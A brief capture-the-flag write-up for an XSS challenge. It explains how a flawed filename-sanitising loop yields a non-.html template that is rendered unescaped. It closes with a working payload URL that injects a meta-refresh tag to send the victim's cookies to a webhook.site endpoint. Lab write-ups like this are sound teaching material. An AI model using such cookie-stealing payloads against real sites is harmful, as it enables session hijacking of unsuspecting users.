## EasyXSSChallenge writeup

This is an XSS challenge.

The for loop to remove illegal characters is inherently flawed, thus we can trivially add a '.' to our filename by creating a file with the name 'xss..blah'. This creates a file called 'xss.blah'.

The content of 'xss.blah' should be set to nothing

When 'xss.blah' is rendered using render_template, as it does not end with .html, whatever is passed into `xss` does not get escaped. This is a vector for XSS.

Due to the fact that the innerHTML is injected, and ends with "'>", we can create a meta tag to capture the document.cookie and redirect to our webhook.

The solution can look like:
http://localhost:38457/render?filename=xss.blah&title=%3Cmeta%20http-equiv=%27refresh%27%20content=%270;%20https://webhook.site/WEBHOOK_ID?a=